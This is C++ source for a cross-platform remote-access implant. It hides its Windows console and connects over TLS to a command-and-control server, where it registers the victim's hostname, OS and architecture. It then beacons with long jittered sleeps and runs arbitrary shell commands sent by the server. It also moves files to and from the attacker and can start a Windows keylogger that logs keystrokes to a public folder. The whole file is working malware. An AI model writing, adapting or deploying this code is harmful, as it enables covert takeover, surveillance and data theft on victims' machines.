#include <cstdio>
#include <time.h> 
#include <algorithm> 
#include <unistd.h>
#include <stdbool.h>
#include <fcntl.h>
#include <string>
#include <sys/stat.h>
#include <filesystem>

#include <iostream>
#include "./includes/cJSON/cJSON.h"
#ifdef _WIN32
    #define SECURITY_WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <security.h>
    #include <schannel.h>
    #ifndef file_path
    #define file_path "\\windows\\Temp\\id"  //"z:\\tmp\\id"    
    #endif
    #define SLEEP(seconds) Sleep((seconds) * 1000) 
#else
    //#include <cjson/cJSON.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>
    #include <sys/utsname.h>
    #include <sys/ioctl.h>
    #include <net/if.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <sys/socket.h>
    #ifndef file_path
    #define file_path "/tmp/id"
    #endif
    #define SLEEP(seconds) sleep(seconds)
#endif

using namespace std;


#define BUFFER 4096
#define BUFFER_SIZE 4096
#define max_response 0x20000
#define MAX_RESPONSE 0x20000
#define FILE_CHUNK 0x256

#ifndef ADDR
#define ADDR "127.0.0.1"
#endif

#ifndef PORT
#define PORT 7777
#endif

// prototypes
class Keylogger {
    public:
    #ifdef _WIN32
    inline static  char keyloggerfile[256] = "C:\\Users\\Public\\log.txt";
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    static DWORD WINAPI StartWindowsKeylogger(LPVOID arg);
    #else

    #endif
};


class GetDeviceInfo {
    public:
    const char* get_arch();
};

class Communicate {
    private:
    #ifdef _WIN32
        SOCKET sock = INVALID_SOCKET;
        CredHandle hCred;
        CtxtHandle hCtxt;
        SecPkgContext_StreamSizes streamSizes;
    #else
        int sock;
        SSL_CTX *ctx;
        SSL *ssl;
    #endif
    public:
    Communicate();
    int RECV(char *buffer, int buffer_len);
    int SEND(const char *buffer, int buffer_len);
    int upload_to_server(const char* path);
    int download_from_server(const char* path);
    int register_implant();
    int beacon_implant();
};

int jitter();

int main() {
    #ifdef _WIN32
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("consoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    #endif

    Communicate com;
    

    while (1) {
        FILE *fp = fopen(file_path, "r");
        if (!fp) {
            if (com.register_implant() != 0) {
                SLEEP(jitter());
                 continue;
            }
        }
        com.beacon_implant();
    }
    return 0;
}

Communicate::Communicate() {
    #ifdef _WIN32
        START_WINDOWS_CONNECTION:
        WSADATA wsaData;
        struct sockaddr_in serverAddress;
        SECURITY_STATUS ss;
        SCHANNEL_CRED schannel_cred = {0};
        SecBufferDesc OutBufferDesc;
        SecBuffer OutBuffers[1];
        DWORD OutFlags;
        TimeStamp tsExpiry;

        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            SLEEP(jitter());
            goto START_WINDOWS_CONNECTION;
        }

        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            SLEEP(jitter());
            goto START_WINDOWS_CONNECTION;
        }

        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(PORT);
        serverAddress.sin_addr.s_addr = inet_addr(ADDR);

        start_connect:
        if (connect(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
            SLEEP(jitter());
            goto start_connect;
        }

        schannel_cred.dwVersion = SCHANNEL_CRED_VERSION;
        schannel_cred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
        schannel_cred.dwFlags = SCH_CRED_MANUAL_CRED_VALIDATION;

        ss = AcquireCredentialsHandle(NULL, UNISP_NAME, SECPKG_CRED_OUTBOUND, NULL, &schannel_cred, NULL, NULL, &hCred, &tsExpiry);
        if (ss != SEC_E_OK) {
            closesocket(sock);
            WSACleanup();
            SLEEP(jitter());
            goto START_WINDOWS_CONNECTION;
        }

        OutBufferDesc.cBuffers = 1;
        OutBufferDesc.pBuffers = OutBuffers;
        OutBufferDesc.ulVersion = SECBUFFER_VERSION;
        OutBuffers[0].BufferType = SECBUFFER_TOKEN;
        OutBuffers[0].cbBuffer = 0;
        OutBuffers[0].pvBuffer = NULL;

        ss = InitializeSecurityContext(&hCred, NULL, (SEC_CHAR *)ADDR, ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, NULL, 0, &hCtxt, &OutBufferDesc, &OutFlags, &tsExpiry);
        if (ss != SEC_E_OK && ss != SEC_I_CONTINUE_NEEDED) {
            FreeCredentialsHandle(&hCred);
            closesocket(sock);
            WSACleanup();
            SLEEP(jitter());
            goto START_WINDOWS_CONNECTION;
        }

        if (OutBufferDesc.cBuffers > 0 && OutBuffers[0].cbBuffer > 0) {
            send(sock, (const char *)OutBuffers[0].pvBuffer, OutBuffers[0].cbBuffer, 0);
            FreeContextBuffer(OutBuffers[0].pvBuffer);
        }

        do {
            SecBuffer InBuffer[1];
            SecBufferDesc InBufferDesc;

            InBuffer[0].BufferType = SECBUFFER_TOKEN;
            InBuffer[0].cbBuffer = 4096;
            InBuffer[0].pvBuffer = malloc(4096);
            if (!InBuffer[0].pvBuffer) {
                SLEEP(jitter());
                goto START_WINDOWS_CONNECTION;
            }

            int bytesRead = recv(sock, (char *)InBuffer[0].pvBuffer, 4096, 0);
            if (bytesRead <= 0) {
                free(InBuffer[0].pvBuffer);
                DeleteSecurityContext(&hCtxt);
                FreeCredentialsHandle(&hCred);
                closesocket(sock);
                WSACleanup();
                SLEEP(jitter());
                goto START_WINDOWS_CONNECTION;
            }
            InBuffer[0].cbBuffer = bytesRead;

            InBufferDesc.cBuffers = 1;
            InBufferDesc.pBuffers = InBuffer;
            InBufferDesc.ulVersion = SECBUFFER_VERSION;

            OutBufferDesc.cBuffers = 1;
            OutBufferDesc.pBuffers = OutBuffers;
            OutBufferDesc.ulVersion = SECBUFFER_VERSION;
            OutBuffers[0].BufferType = SECBUFFER_TOKEN;
            OutBuffers[0].cbBuffer = 0;
            OutBuffers[0].pvBuffer = NULL;

            ss = InitializeSecurityContext(&hCred, &hCtxt, (SEC_CHAR *)ADDR, ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, &InBufferDesc, 0, &hCtxt, &OutBufferDesc, &OutFlags, &tsExpiry);

            free(InBuffer[0].pvBuffer);

            if (OutBufferDesc.cBuffers > 0 && OutBuffers[0].cbBuffer > 0) {
                send(sock, (const char *)OutBuffers[0].pvBuffer, OutBuffers[0].cbBuffer, 0);
                FreeContextBuffer(OutBuffers[0].pvBuffer);
            }

        } while (ss == SEC_I_CONTINUE_NEEDED);

        if (ss != SEC_E_OK) {
            DeleteSecurityContext(&hCtxt);
            FreeCredentialsHandle(&hCred);
            closesocket(sock);
            WSACleanup();
            SLEEP(jitter());
            goto START_WINDOWS_CONNECTION;
        }


        QueryContextAttributes(&hCtxt, SECPKG_ATTR_STREAM_SIZES, &streamSizes);
        #else
        START_LINUX_CONNECTION:
        struct sockaddr_in server_addr;
        struct hostent *server;

        // 1. Initialize OpenSSL
        SSL_load_error_strings();
        SSL_library_init();
        OpenSSL_add_all_algorithms();

        // 2. Create SSL context (TLS client)
        ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) {
            SLEEP(jitter());
            goto START_LINUX_CONNECTION;
        }

        // 3. Create TCP socket
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            SSL_CTX_free(ctx);
            SLEEP(jitter());
            goto START_LINUX_CONNECTION;
        }

        server = gethostbyname(ADDR);
        if (!server) {
            close(sock);
            SSL_CTX_free(ctx);
            SLEEP(jitter());
            goto START_LINUX_CONNECTION;
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
        server_addr.sin_port = htons(PORT);

        // 4. Connect TCP
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            SSL_CTX_free(ctx);
            sleep(jitter());
            goto START_LINUX_CONNECTION;
        }

        // 5. Create SSL object and bind to socket
        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);

        // 6. TLS handshake
        if (SSL_connect(ssl) <= 0) {
            SSL_free(ssl);
            close(sock);
            SSL_CTX_free(ctx);
            sleep(jitter());
            goto START_LINUX_CONNECTION;
        }
        #endif
}

#ifdef _WIN32
int Communicate::SEND(const char *buffer, int buffer_len) {
    char *message = (char*)malloc(streamSizes.cbHeader + buffer_len + streamSizes.cbTrailer);
    if (!message) return -1;

    SecBuffer buffers[3];
    SecBufferDesc desc;

    memcpy(message + streamSizes.cbHeader, buffer, buffer_len);

    buffers[0].pvBuffer = message;
    buffers[0].cbBuffer = streamSizes.cbHeader;
    buffers[0].BufferType = SECBUFFER_STREAM_HEADER;

    buffers[1].pvBuffer = message + streamSizes.cbHeader;
    buffers[1].cbBuffer = buffer_len;
    buffers[1].BufferType = SECBUFFER_DATA;

    buffers[2].pvBuffer = message + streamSizes.cbHeader + buffer_len;
    buffers[2].cbBuffer = streamSizes.cbTrailer;
    buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;

    desc.cBuffers = 3;
    desc.pBuffers = buffers;
    desc.ulVersion = SECBUFFER_VERSION;

    SECURITY_STATUS status = EncryptMessage(&hCtxt, 0, &desc, 0);
    if (status != SEC_E_OK) {
        free(message);
        return -1;
    }

    int totalSize = buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer;
    int sent = send(sock, message, totalSize, 0);
    free(message);

    return sent;
}

int Communicate::RECV(char *buffer, int buffer_len) {
    char encrypted[4096];
    SecBuffer secBuffers[4];
    SecBufferDesc secBufferDesc;
    SECURITY_STATUS status;

    int bytesRead = recv(sock, encrypted, sizeof(encrypted), 0);
    if (bytesRead <= 0) return -1;

    secBuffers[0].BufferType = SECBUFFER_DATA;
    secBuffers[0].pvBuffer = encrypted;
    secBuffers[0].cbBuffer = bytesRead;
    secBuffers[1].BufferType = SECBUFFER_EMPTY;
    secBuffers[2].BufferType = SECBUFFER_EMPTY;
    secBuffers[3].BufferType = SECBUFFER_EMPTY;

    secBufferDesc.cBuffers = 4;
    secBufferDesc.pBuffers = secBuffers;
    secBufferDesc.ulVersion = SECBUFFER_VERSION;

    status = DecryptMessage(&hCtxt, &secBufferDesc, 0, NULL);
    if (status != SEC_E_OK) return -1;

    for (int i = 0; i < 4; i++) {
        if (secBuffers[i].BufferType == SECBUFFER_DATA) {
            memcpy(buffer, secBuffers[i].pvBuffer, min(static_cast<size_t>(buffer_len), static_cast<size_t>(secBuffers[i].cbBuffer)));
            return secBuffers[i].cbBuffer;
        }
    }
    return -1;
}
#else
int Communicate::SEND(const char *buffer, int buffer_len) {
    int sent = SSL_write(ssl, buffer, buffer_len);
    if (sent <= 0) {
        int err = SSL_get_error(ssl, sent);
        return -1;
    }
    return sent;

}

int Communicate::RECV(char *buffer, int buffer_len) {
    int received = SSL_read(ssl, buffer, buffer_len);
    if (received <= 0) {
        int err = SSL_get_error(ssl, received);
        return -1;
    }
    return received;
}
#endif



int Communicate::register_implant() {
    GetDeviceInfo device;
    char hostname[BUFFER_SIZE];
    char os[BUFFER_SIZE];
    if (gethostname(hostname, sizeof(hostname)) != 0) snprintf(hostname, sizeof(hostname), "Unknown");
    const char *arch = device.get_arch(); 
    #ifdef _WIN32
    snprintf(os,sizeof(os), "%s", "windows");
    #else
    snprintf(os,sizeof(os), "%s", "linux");
    #endif

    cJSON *reg = cJSON_CreateObject();
    if (!reg) return -1;

    cJSON_AddStringToObject(reg, "mode", "register");
    cJSON_AddStringToObject(reg, "os", os);
    cJSON_AddStringToObject(reg, "hostname", hostname);
    cJSON_AddStringToObject(reg, "arch", arch);
    char *data = cJSON_Print(reg);

    if (SEND(data, strlen(data)) ==  -1) {
        return -1;
    }

    free(data);
    cJSON_Delete(reg);

    char buffer[BUFFER_SIZE];
    if (RECV(buffer, sizeof(buffer)) == -1) {
        // handle this
        return -1;
    }

    cJSON *reply = cJSON_Parse(buffer);
    if (!reply) return -1;

    cJSON *id = cJSON_GetObjectItem(reply, "implant_id");

    FILE *f = fopen(file_path, "w");
    if (!f) {
        return -1;
    }

    fprintf(f, "%s", id->valuestring);
    //fwrite(id->valuestring, 1, sizeof(id->valuestring), f);
    fclose(f);
    cJSON_Delete(reply);
    return 0;
}


int Communicate::beacon_implant() {
    
    cJSON *beacon = cJSON_CreateObject();
    if (!beacon) {
        return -1;
    }

    FILE *fp = fopen(file_path, "r");
    if (!fp) return -1;
    char id[9];
    if (fgets(id, sizeof(id), fp) != NULL) {
        id[strcspn(id, "\r\n")] = '\0';
    } else {
        return -1;
    }

    fclose(fp);
    
    cJSON_AddStringToObject(beacon, "mode", "beacon");
    cJSON_AddStringToObject(beacon, "implant_id", id);
    char *data = cJSON_Print(beacon);
    if (SEND(data, strlen(data)) == -1) {
        cJSON_Delete(beacon);
        free(data);
        return -1;
    }
    free(data);
    cJSON_Delete(beacon);

    char buffer[BUFFER_SIZE];
    if (RECV(buffer, sizeof(buffer)) == -1) {
        return -1;
    }

    cJSON *command = cJSON_Parse(buffer);
    cJSON *mode = cJSON_GetObjectItem(command, "mode");
    if (strcmp(mode->valuestring, "none") == 0) {
        cJSON_Delete(command);    
        return 0;
    }

    cJSON *cmd = cJSON_GetObjectItem(command, "command");
    cJSON *task_id = cJSON_GetObjectItem(command, "task_id");
    
    char result[MAX_RESPONSE];
    char command_with_redirect[BUFFER_SIZE + 256];

    FILE *exec;
    cJSON *reply = cJSON_CreateObject();
    if (!reply) return -1;

    if (strncmp(cmd->valuestring, "upload", 6) == 0) {
        char path[BUFFER_SIZE];
        sscanf(cmd->valuestring, "upload %s", path);
        upload_to_server(path);
        strcpy(result, "File Download Successfully");
        goto SEND_RESULT;
        return 0;
    } else if (strncmp(cmd->valuestring, "download", 8) == 0) { 
        char path[BUFFER_SIZE];
        sscanf(cmd->valuestring, "download %s", path);
        download_from_server(path);
        strcpy(result, "File Uploaded Successfully");
        goto SEND_RESULT;
    } else if (strncmp(cmd->valuestring, "keylogger", 9) == 0) {
        #ifdef _WIN32
            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger::StartWindowsKeylogger, NULL, 0, NULL);
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
            strcpy(result, "Started Windows keylogger successfully");
        #else
            pthread_t KeyloggerThread; 
            //pthread_create(&KeyloggerThread, NULL, StartLinuxKeylogger, NULL);
            //pthread_join(KeyloggerThread, NULL);
            strcpy(result, "Started Linux keylogger successfully");
        #endif
        goto SEND_RESULT;
        return 0;
    }

    memset(buffer, 0, sizeof(buffer));
    snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", cmd->valuestring);

   
    #ifdef _WIN32
    exec = _popen(command_with_redirect, "r");
    #else
    exec = popen(command_with_redirect, "r");
    #endif

    if (!exec) {
        strcpy(result, "Failed to execute command.");
        goto SEND_RESULT;
    }

    while (fgets(buffer, sizeof(buffer), exec) != NULL) {
        strcat(result, buffer);
    }
    SEND_RESULT:
    cJSON_AddStringToObject(reply, "mode", "result");
    cJSON_AddStringToObject(reply, "implant_id", id);
    cJSON_AddNumberToObject(reply, "task_id", task_id->valueint);
    cJSON_AddStringToObject(reply, "response", result);
    char *result_ = cJSON_Print(reply);

    if (SEND(result_, strlen(result_)) == -1) {
        fclose(exec);
        cJSON_Delete(reply);
        free(result_);
        return -1;
    }
    fclose(exec);
    cJSON_Delete(reply);
    free(result_);
    return 0;
}


int jitter() {
    srand(time(0));
    const int MIN_SECONDS = 0xfff;  //1 * 3600;   // 1 hours (1 * 60 * 60)
    const int MAX_SECONDS = 0xffff;  //3 * 3600;  // 3 hours (3 * 60 * 60)
    return MIN_SECONDS + rand() % (MAX_SECONDS - MIN_SECONDS + 1);
}


const char* GetDeviceInfo::get_arch() {
    #ifdef _WIN32
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);
    switch (sysInfo.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: return "x64"; break;
        case PROCESSOR_ARCHITECTURE_INTEL: return  "x86"; break;
        case PROCESSOR_ARCHITECTURE_ARM64: return  "ARM64"; break;
        default: return "unknown"; break;
    }
    #else
        char *arch = (char*)malloc(0x32);
        struct utsname buffer;
        if (uname(&buffer) == 0) {
            snprintf(arch, 0x32, "%s", buffer.machine);
            return arch; 
        } else {
            return "Error getting architecture.\n";
        }
    #endif
}


#ifdef _WIN32
LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    int keyCount = 0;
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
        FILE* file;
        fopen_s(&file, keyloggerfile, "a");
        if (file != NULL) {
            fprintf(file, "%lu", vkCode);
            fclose(file);
        }
        keyCount++;
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

DWORD WINAPI Keylogger::StartWindowsKeylogger(LPVOID arg) {
        HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
        // wait for events
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        // delete hook
        UnhookWindowsHookEx(hook);
        return 0;
    }
#else 

#endif



int Communicate::download_from_server(const char* path) {
    char *contents = (char*)malloc(MAX_RESPONSE);
    if (contents == NULL) {
        return -1;
    }

    //cJSON *file = cJSON_CreateObject();
    //if (!file) {
    //    free(contents);
    //    return -1;
    //}

    char filename[BUFFER_SIZE];
    RECV(filename, sizeof(filename));

    int fd = open(filename, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if (fd == -1) {
        free(contents);
         return -1;
    }

    size_t bytesRead;
    char Filesize[BUFFER_SIZE];
    RECV(Filesize, sizeof(Filesize));
    size_t filesize = (size_t)atoi(Filesize);

    size_t received = 0;
    while (received < filesize) {
        bytesRead = RECV(contents, FILE_CHUNK);
        write(fd, contents, bytesRead);
        received += bytesRead;
    }

    free(contents);
    return 0;
}

int Communicate::upload_to_server(const char* path) {
    if (access(path, F_OK) != 0) return -1;
    char *contents = (char*)malloc(MAX_RESPONSE);
    if (contents == NULL) return 1;
    
    std::filesystem::path p(path);
    std::string filename_str = p.filename().string();
    const char* filename = filename_str.c_str();

    SEND(filename, strlen(filename));

    int fd = open(filename, O_RDONLY);
    if (fd == -1) {
        free(contents);
         return -1;
    }

    struct stat st;
    fstat(fd, &st);
    size_t filesize = st.st_size;
    //SSL_write(ssl, &filesize, sizeof(filesize));
    char FileSize[BUFFER_SIZE]; 

    snprintf(FileSize, 0x20, "%zu", filesize);
    SEND(FileSize, strlen(FileSize));

    size_t bytesRead;
    while ((bytesRead = read(fd, contents, FILE_CHUNK)) > 0) {
        SEND(contents, bytesRead);
    }
    free(contents);

    return 0;
}